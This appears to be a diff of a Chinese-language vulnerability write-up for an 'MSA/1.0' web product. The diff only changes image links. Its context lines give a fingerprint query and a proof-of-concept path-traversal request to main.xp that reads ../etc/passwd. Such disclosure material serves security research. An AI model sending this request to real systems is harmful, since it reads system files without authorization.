@@ -20,7 +20,7 @@ app="MSA/1.0"
 
 登录页面如下
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202162301720.png)
+![](./images/202202162301720.png)
 
 构造POC
 
@@ -28,4 +28,4 @@ app="MSA/1.0"
 /msa/main.xp?Fun=msaDataCenetrDownLoadMore+delflag=1+downLoadFileName=msagroup.txt+downLoadFile=../etc/passwd
 ```
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202162301323.png)
+![](./images/202202162301323.png)
